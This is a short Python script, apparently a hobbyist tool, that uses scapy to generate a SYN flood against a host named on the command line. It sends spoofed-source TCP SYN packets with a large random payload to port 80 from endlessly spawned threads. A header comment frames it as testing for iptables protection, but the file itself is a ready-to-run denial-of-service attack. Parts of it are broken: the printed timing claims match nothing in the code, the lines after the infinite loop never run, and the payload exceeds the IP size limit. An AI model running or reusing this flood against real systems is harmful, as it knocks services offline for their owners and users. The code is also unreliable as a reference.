#! /usr/bin/env python
# Name : Subodh Pachghare
# CyberSpace Name : HaX0R (Cyberninja)
# Website : www.thesubodh.com
# Description : SYN Flood Packet creation for iptables prevention solution

import sys
from scapy.all import *
import threading
import os

print "generating payload"
payload = "\x00" + os.urandom(65534) + "\x00"

class ThreadClass(threading.Thread):
  def __init__(self, p):
    super(ThreadClass, self).__init__() 
    self.p = p

  def run(self):
    send(self.p)

#conf.verb=0
print "Field Values of packet sent"
p = IP(src="55.55.55.55", dst=sys.argv[1], id=1111,ttl=99)/TCP(sport=RandShort(), dport=[80], seq=12345, ack=1000, window=1000, flags="S")/payload
ls(p)
print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
i = 0
while True:
  print "starting thread %d" % i
  i += 1
  ThreadClass(p).start()
ans,unans = srloop(p, inter=0, retry=0, timeout=0)
print "Summary of answered & unanswered packets"
ans.summary()
unans.summary()
print "source port flags in response"
#for s,r in ans:
# print r.sprintf("%TCP.sport% \t %TCP.flags%")
ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))